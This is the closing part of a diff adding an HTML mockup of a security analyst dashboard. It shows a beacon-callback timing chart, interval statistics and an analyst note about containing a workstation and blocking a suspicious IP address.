+                  <circle cx="188" cy="62" r="4.5"></circle><circle cx="204" cy="61" r="4.5"></circle><circle cx="220" cy="63" r="4.5"></circle>
+                  <circle cx="236" cy="66" r="4.5"></circle><circle cx="252" cy="60" r="4.5"></circle><circle cx="268" cy="64" r="4.5"></circle>
+                  <circle cx="284" cy="62" r="4.5"></circle><circle cx="300" cy="65" r="4.5"></circle><circle cx="316" cy="63" r="4.5"></circle>
+                  <circle cx="332" cy="61" r="4.5"></circle><circle cx="348" cy="64" r="4.5"></circle><circle cx="364" cy="66" r="4.5"></circle>
+                  <circle cx="380" cy="62" r="4.5"></circle><circle cx="396" cy="60" r="4.5"></circle><circle cx="412" cy="63" r="4.5"></circle>
+                  <circle cx="428" cy="65" r="4.5"></circle><circle cx="444" cy="61" r="4.5"></circle><circle cx="460" cy="64" r="4.5"></circle>
+                  <circle cx="476" cy="62" r="4.5"></circle><circle cx="492" cy="63" r="4.5"></circle>
+                </g>
+                <g font-family="SFMono-Regular, Consolas, monospace" font-size="9.5" fill="#5F6B7C" text-anchor="middle">
+                  <text x="44" y="169">13:17</text><text x="160" y="169">13:29</text><text x="276" y="169">13:41</text><text x="392" y="169">13:53</text><text x="500" y="169">14:02</text>
+                </g>
+              </svg>
+            </div>
+            <div style="display:flex;gap:0;border-top:1px solid rgba(255,255,255,.06)">
+              <div style="flex-grow:1;padding:8px 12px;border-right:1px solid rgba(255,255,255,.06)"><div class="lbl">Callbacks</div><div class="mono" style="font-size:16px;color:#F6F7F9;padding-top:3px">41</div></div>
+              <div style="flex-grow:1;padding:8px 12px;border-right:1px solid rgba(255,255,255,.06)"><div class="lbl">Mean Δ</div><div class="mono" style="font-size:16px;color:#F6F7F9;padding-top:3px">60.0 s</div></div>
+              <div style="flex-grow:1;padding:8px 12px;border-right:1px solid rgba(255,255,255,.06)"><div class="lbl">σ</div><div class="mono" style="font-size:16px;color:#F5B871;padding-top:3px">3.4 s</div></div>
+              <div style="flex-grow:1;padding:8px 12px"><div class="lbl">JA3</div><div class="mono" style="font-size:13px;color:#F6F7F9;padding-top:6px">a0e9f5b8…</div></div>
+            </div>
+          </div>
+
+          <div class="panel" style="flex-grow:1;display:flex;flex-direction:column;min-height:0">
+            <div class="ph"><span class="lbl" style="color:#ABB3BF">Analyst notes</span>
+              <div style="flex-grow:1"></div><span class="mono" style="font-size:10.5px;color:#5F6B7C">local only</span>
+            </div>
+            <div style="padding:10px 12px;display:flex;flex-direction:column;gap:9px;flex-grow:1;min-height:0">
+              <div style="display:flex;gap:9px">
+                <div style="width:20px;height:20px;flex:none;border-radius:2px;background:#383E47;display:flex;align-items:center;justify-content:center;font:600 9.5px var(--ui);color:#ABB3BF">RC</div>
+                <div style="flex-grow:1"><div style="font-size:11.5px;color:#C5CBD3;line-height:1.45">Contained WKS14 at 13:22. Run key removed; <span class="mono">ods.exe</span> preserved for hashing. Blocking 185.117.88.42 at the edge next.</div><div class="mono" style="font-size:10px;color:#5F6B7C;padding-top:3px">13:24 Z</div></div>
+              </div>
+              <div style="flex-grow:1;min-height:44px;background:#111418;border:1px solid #404854;border-radius:2px;padding:8px 9px">
+                <span style="font-size:11.5px;color:#5F6B7C">Add a note…</span>
+              </div>
+              <div style="display:flex;gap:8px"><button class="btn btn-primary">Save note</button><div style="flex-grow:1"></div><button class="btn btn-min">Export alert JSON</button></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</x-dc>
+</body>
+</html>
